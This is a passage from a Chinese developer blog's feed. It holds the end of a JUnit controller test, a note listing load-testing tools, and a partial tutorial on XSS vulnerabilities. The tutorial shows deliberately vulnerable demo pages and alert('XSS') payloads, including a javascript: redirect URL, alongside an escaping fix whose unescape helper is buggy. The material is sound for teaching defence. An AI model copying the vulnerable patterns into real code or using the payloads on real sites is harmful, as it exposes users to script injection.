<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TestProjectTagController</span> <span class="token punctuation">{</span>

  <span class="token annotation punctuation">@Autowired</span>
  <span class="token class-name">ProjectTagService</span> projectTagService<span class="token punctuation">;</span>

  <span class="token class-name">Dispatcher</span> dispatcher<span class="token punctuation">;</span>

  <span class="token annotation punctuation">@Before</span>
  <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">before</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token class-name">ProjectTagControllor</span> projectTagControllor <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ProjectTagControllor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    projectTagControllor<span class="token punctuation">.</span><span class="token function">setProjectTagService</span><span class="token punctuation">(</span>projectTagService<span class="token punctuation">)</span><span class="token punctuation">;</span>
    dispatcher <span class="token operator">=</span> <span class="token class-name">MockDispatcherFactory</span><span class="token punctuation">.</span><span class="token function">createDispatcher</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    dispatcher<span class="token punctuation">.</span><span class="token function">getRegistry</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addSingletonResource</span><span class="token punctuation">(</span>projectTagControllor<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token annotation punctuation">@Test</span>
  <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">testProjectTags</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">URISyntaxException</span> <span class="token punctuation">{</span>
    <span class="token class-name">MockHttpRequest</span> request <span class="token operator">=</span> <span class="token class-name">MockHttpRequest</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"/rest/project/123456/tags"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">MockHttpResponse</span> response <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MockHttpResponse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    dispatcher<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>request<span class="token punctuation">,</span> response<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">Assert</span><span class="token punctuation">.</span><span class="token function">assertEquals</span><span class="token punctuation">(</span><span class="token class-name">HttpServletResponse</span><span class="token punctuation">.</span><span class="token constant">SC_NOT_FOUND</span><span class="token punctuation">,</span> response<span class="token punctuation">.</span><span class="token function">getStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">Assert</span><span class="token punctuation">.</span><span class="token function">assertEquals</span><span class="token punctuation">(</span><span class="token string">"指定的项目不存在"</span><span class="token punctuation">,</span> response<span class="token punctuation">.</span><span class="token function">getContentAsString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
]]></content>
      <categories>
        <category>后端</category>
      </categories>
      <tags>
        <tag>Junit</tag>
      </tags>
  </entry>
  <entry>
    <title>压测工具概述</title>
    <url>/20221030/e291c7ca.html</url>
    <content><![CDATA[<p>JMeter</p>
<p>Java 微基准测试（JMH）</p>
<p>AB (Apache Benchmark)</p>
<p>几种性能测试工具的总结 - Thoughtworks洞见：<a href="https://insights.thoughtworks.cn/performance-testing-tools/">https://insights.thoughtworks.cn/performance-testing-tools/</a></p>
]]></content>
      <categories>
        <category>后端</category>
      </categories>
      <tags>
        <tag>TODO</tag>
        <tag>测试</tag>
      </tags>
  </entry>
  <entry>
    <title>XSS漏洞处理</title>
    <url>/20221025/409b5317.html</url>
    <content><![CDATA[<h1><a href="https://segmentfault.com/a/1190000019980090">前端安全系列：XSS篇</a></h1>
<h2 id="XSS攻击">XSS攻击</h2>
<p>全称跨站脚本攻击，为不和<code>层叠样式表(Cascading Style Sheets, CSS)</code>的缩写混淆，故将跨站脚本攻击缩写为XSS，XSS是一种在web应用中的计算机安全漏洞，它允许恶意web用户将代码植入到提供给其它用户使用的页面中</p>
<h2 id="XSS攻击的危害">XSS攻击的危害</h2>
<ol>
<li>盗取各类用户帐号，如机器登录帐号、用户网银帐号、各类管理员帐号</li>
<li>控制企业数据，包括读取、篡改、添加、删除企业敏感数据的能力</li>
<li>盗窃企业重要的具有商业价值的资料</li>
<li>非法转账</li>
<li>强制发送电子邮件</li>
<li>网站挂马</li>
<li>控制受害者机器向其它网站发起攻击</li>
</ol>
<h2 id="XSS漏洞的分类">XSS漏洞的分类</h2>
<h3 id="本地利用漏洞">本地利用漏洞</h3>
<p>这种漏洞存在于浏览器页面中,属于前端自身问题基于DOM文档对象模型的一种漏洞,大概步骤:</p>
<ol>
<li>A给B发送一个恶意构造的URL</li>
<li>B打开恶意URL</li>
<li>B的浏览器页面中包含恶意代码</li>
<li>A的恶意代码可以拥有B的持有权限,进而获取B的数据或者冒充B的行为</li>
</ol>
<p>通过修改浏览器页面中的DOM(DocumentObjectModel)时，就有可能产生这种漏洞</p>
<h3 id="反射式漏洞">反射式漏洞</h3>
<p>服务端没有对数据进行过滤、验证或者编码等处理直接返回前端可能引起的漏洞</p>
<ol>
<li>A给B发送一个恶意构造的URL</li>
<li>B打开目标网站,浏览器将包含恶意代码的数据通过请求传递给服务端,其不加处理直接返回给浏览器</li>
<li>B的浏览器接收到响应后解析并执行的代码中包含恶意代码</li>
<li>A的恶意代码可以拥有B的持有权限,进而获取B的数据或者冒充B的行为</li>
</ol>
<p>常见于网站搜索栏,登录注册等地方窃取用户cookies或者进行钓鱼欺骗.因为其中涉及到服务端的参与,想要避免需要后端协调.</p>
<h3 id="存储式漏洞">存储式漏洞</h3>
<p>类似反射式但是会把未经处理的数据储存在数据库中</p>
<ol>
<li>A将恶意代码提交到目标网站的数据库中</li>
<li>B打开目标网站,服务端将恶意代码从数据库取出拼接在HTML中返回给浏览器</li>
<li>B的浏览器接收到响应后解析并执行的代码中包含恶意代码</li>
<li>A的恶意代码可以拥有B的持有权限,进而获取B的数据或者冒充B的行为</li>
</ol>
<p>这是属于持久性攻击,涉及范围可能包括所有的访问用户,一般常用网站留言,评论,博客日志等.</p>
<h3 id="大致对比">大致对比</h3>
<table>
<thead>
<tr>
<th style="text-align:center">类型</th>
<th>本地利用</th>
<th>反射式</th>
<th>存储式</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">触发</td>
<td>用户打开恶意构造的URL</td>
<td>用户打开恶意构造的URL</td>
<td>1. 用户打开恶意构造的URL <br>2. 攻击者构造脚本</td>
</tr>
<tr>
<td style="text-align:center">储存</td>
<td>URL</td>
<td>URL</td>
<td>数据库</td>
</tr>
<tr>
<td style="text-align:center">输出</td>
<td>前端</td>
<td>后端</td>
<td>后端</td>
</tr>
<tr>
<td style="text-align:center">方式</td>
<td>DOM</td>
<td>HTTP响应</td>
<td>HTTP响应</td>
</tr>
</tbody>
</table>
<h2 id="XSS-常见案例">XSS 常见案例</h2>
<h3 id="公司网站新上线一个搜索功能-B写了这段代码">公司网站新上线一个搜索功能,B写了这段代码</h3>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=device-width, initial-scale=1.0<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>X-UA-Compatible<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ie=edge<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>demo<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">&gt;</span></span><span class="token style"><span class="token language-css">
            <span class="token selector">input</span> <span class="token punctuation">{</span>
                <span class="token property">width</span><span class="token punctuation">:</span> 600px<span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span>
            input:
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>in<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>submit<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span>
            output:
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>out<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>

        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://libs.baidu.com/jquery/2.0.0/jquery.min.js<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
            <span class="token function">$</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">var</span> $input <span class="token operator">=</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#in'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">var</span> $output <span class="token operator">=</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#out'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">var</span> $submit <span class="token operator">=</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#submit'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

                $submit<span class="token punctuation">.</span><span class="token function">click</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    <span class="token keyword">var</span> val <span class="token operator">=</span> $input<span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    $output<span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span>val<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">html</span><span class="token punctuation">(</span>val<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>完整源码可以查看<a href="https://link.segmentfault.com/?enc=FNz4mkAO1XJLu2iC5i%2FPiw%3D%3D.cmiLfQq4GjBOFv2hua84FGOkLqWF9bOwgmu05qyXEXrGfHQlIS8vcph9iSsQQCdt">demo1</a><br>
某天,让A知道之后他输入这么一段代码,然后提交之后发现</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'XSS'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/bVbvZSv-1670834128685-1.png" alt="图片描述"></p>
<p>类似的用户输入内容都可能被攻击者利用拼接特殊格式的字符串形成恶意代码,通过注入脚本引发潜在风险,浏览器不会区分善恶,只是按照代码解析,于是B想了一个办法告诉浏览器这段内容不该解析,所以改了一下,简单转义输入内容</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">escapeHtml</span><span class="token punctuation">(</span><span class="token parameter">text</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">return</span> text<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">[&lt;&gt;"&amp;]</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">match<span class="token punctuation">,</span> pos<span class="token punctuation">,</span> originalText</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">switch</span> <span class="token punctuation">(</span>match<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">case</span> <span class="token string">'&lt;'</span><span class="token operator">:</span>
        <span class="token keyword">return</span> <span class="token string">'&amp;lt;'</span><span class="token punctuation">;</span>
      <span class="token keyword">case</span> <span class="token string">'&gt;'</span><span class="token operator">:</span>
        <span class="token keyword">return</span> <span class="token string">'&amp;gt;'</span><span class="token punctuation">;</span>
      <span class="token keyword">case</span> <span class="token string">'&amp;'</span><span class="token operator">:</span>
        <span class="token keyword">return</span> <span class="token string">'&amp;amp;'</span><span class="token punctuation">;</span>
      <span class="token keyword">case</span> <span class="token string">'"'</span><span class="token operator">:</span>
        <span class="token keyword">return</span> <span class="token string">'&amp;quot;'</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function">unescapeHtml</span><span class="token punctuation">(</span><span class="token parameter">str</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">return</span> text<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">[&lt;&gt;"&amp;]</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">match<span class="token punctuation">,</span> pos<span class="token punctuation">,</span> originalText</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">switch</span> <span class="token punctuation">(</span>match<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">case</span> <span class="token string">'&amp;lt;'</span><span class="token operator">:</span>
        <span class="token keyword">return</span> <span class="token string">'&lt;'</span><span class="token punctuation">;</span>
      <span class="token keyword">case</span> <span class="token string">'&amp;gt;'</span><span class="token operator">:</span>
        <span class="token keyword">return</span> <span class="token string">'&gt;'</span><span class="token punctuation">;</span>
      <span class="token keyword">case</span> <span class="token string">'&amp;amp;'</span><span class="token operator">:</span>
        <span class="token keyword">return</span> <span class="token string">'&amp;'</span><span class="token punctuation">;</span>
      <span class="token keyword">case</span> <span class="token string">'&amp;quot;'</span><span class="token operator">:</span>
        <span class="token keyword">return</span> <span class="token string">'"'</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

$submit<span class="token punctuation">.</span><span class="token function">click</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">var</span> val <span class="token operator">=</span> <span class="token function">escapeHtml</span><span class="token punctuation">(</span>$input<span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  $output<span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span>val<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">html</span><span class="token punctuation">(</span>val<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>完整源码可以查看<a href="https://link.segmentfault.com/?enc=7%2BulsDr5cJb65Dru5wIBLQ%3D%3D.MkzYuT3mLjcpFBshJDeed1lo4CRy1%2B3FKB29NhvTZir3%2FCtA8ETGTLsUMhvFmQXW">demo2</a><br>
现在浏览器就不会再执行里面的代码了,实际业务中应该转义的内容不止这么简单</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/bVbvZSp-1670834128685-3.png" alt="图片描述"></p>
<h3 id="基于某些业务-例如登录-订单等需要携带参数或者重定向等信息-B写了这么一个页面">基于某些业务,例如登录,订单等需要携带参数或者重定向等信息,B写了这么一个页面</h3>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>demo<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span>
            output:
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>out<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>jump<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>jump<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>

        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://libs.baidu.com/jquery/2.0.0/jquery.min.js<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
            <span class="token function">$</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">var</span> $jump <span class="token operator">=</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#jump'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">var</span> $output <span class="token operator">=</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#out'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">var</span> $submit <span class="token operator">=</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#submit'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

                <span class="token keyword">function</span> <span class="token function">getQueryString</span><span class="token punctuation">(</span><span class="token parameter">name</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    <span class="token keyword">var</span> reg <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RegExp</span><span class="token punctuation">(</span><span class="token string">'(^|&amp;)'</span> <span class="token operator">+</span> name <span class="token operator">+</span> <span class="token string">'=([^&amp;]*)(&amp;|$)'</span><span class="token punctuation">,</span> <span class="token string">'i'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token keyword">var</span> r <span class="token operator">=</span> window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>search<span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span>reg<span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token keyword">if</span> <span class="token punctuation">(</span>r <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token function">unescape</span><span class="token punctuation">(</span>r<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>

                <span class="token keyword">var</span> val <span class="token operator">=</span> <span class="token function">getQueryString</span><span class="token punctuation">(</span><span class="token string">'redirect_to'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        $output<span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span>val<span class="token punctuation">)</span>
                $jump<span class="token punctuation">.</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token string">'href'</span><span class="token punctuation">,</span> val<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>完整源码可以查看<a href="https://link.segmentfault.com/?enc=iN%2FDwn9%2F8fycAncTRlrXKA%3D%3D.DVFSSINJ%2FfLXCiLJLyfw3GVNbolgisMCBONF%2FsmFnz59VkbkSfVqBtyCY%2BdfykrZ">demo3</a><br>
A发现一个漏洞,然后发了这个网址给其他人打开</p>
<pre class="line-numbers language-awk" data-language="awk"><code class="language-awk">https<span class="token operator">:</span><span class="token regex">//</span>www.test.com<span class="token operator">/</span><span class="token operator">?</span>redirect_to<span class="token operator">=</span>javascript<span class="token operator">:</span><span class="token function">alert</span><span class="token punctuation">(</span>'XSS'<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>当他们点击跳转的时候就会触发A故意形成的恶意代码</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/bVbvZSa-1670834128685-5.png" alt="图片描述"></p>
<p>像这种情况B第一想法是检验是否网址格式再渲染界面,所以他这么写</p>
<pre class="line-numbers language-kotlin" data-language="kotlin"><code class="language-kotlin">function <span class="token function">testUrl</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">var</span> Expression <span class="token operator">=</span>
    '^<span class="token punctuation">(</span><span class="token punctuation">(</span>https|http|ftp|rtsp|mms<span class="token punctuation">)</span><span class="token operator">?:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token punctuation">)</span><span class="token operator">?</span>' <span class="token operator">+</span>
    '<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token operator">-</span>9a<span class="token operator">-</span>z_<span class="token operator">!</span>~<span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>&amp;<span class="token operator">=</span><span class="token operator">+</span>$<span class="token operator">%</span><span class="token operator">-</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">:</span> <span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token operator">-</span>9a<span class="token operator">-</span>z_<span class="token operator">!</span>~<span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>&amp;<span class="token operator">=</span><span class="token operator">+</span>$<span class="token operator">%</span><span class="token operator">-</span><span class="token punctuation">]</span><span class="token operator">+</span>@<span class="token punctuation">)</span><span class="token 